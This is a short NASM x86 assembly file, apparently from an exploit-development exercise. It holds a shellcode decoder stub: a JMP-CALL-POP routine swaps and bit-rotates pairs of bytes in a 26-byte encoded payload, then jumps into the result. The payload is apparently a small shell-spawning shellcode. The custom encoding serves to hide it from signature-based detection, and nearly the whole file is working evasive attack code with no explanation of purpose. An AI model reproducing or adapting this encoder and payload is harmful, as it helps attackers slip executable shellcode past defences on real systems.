; Filename: kaiten-suwappa.nasm
; Author:  Lucas Kauffman
; Website:  http://cloud101.eu
; Purpose: 

global _start			

section .text
_start:
	jmp short call_shellcode

decoder:
	pop esi
	xor ecx, ecx
	;our shellcode is 26 bytes long but we edit 2 bytes at a time, hence 13 for our loop
	mov cl, 13


decode:
	;move byte2 into al (byte was swapped to index 1)
	mov al, byte  [esi]
	;move byte1 into bl (byte was swapped to index 2)
	mov bl, byte [esi+1]
	;rotate byte2 for 2 bits to the right
	ror al,2
	;rotate byte1 for 4 bits to the left
	rol bl,4
	;place the bytes back on their original position
	mov byte [esi], bl
	mov byte [esi+1],al
	;increment esi by 2 to get the other bytes which follow 
	add esi,2
	;repeat
	loop decode
	;profit
	jmp short EncodedShellcode

call_shellcode:

	call decoder	
	EncodedShellcode: db 0xc4,0x9,0x41,0xc,0xbc,0x86,0xcd,0xf2,0xa1,0x86,0x89,0xf2,0xb9,0x96,0x8f,0x98,0x26,0x5,0x4d,0x2e,0x87,0x98,0x2c,0xb,0x2,0xdc
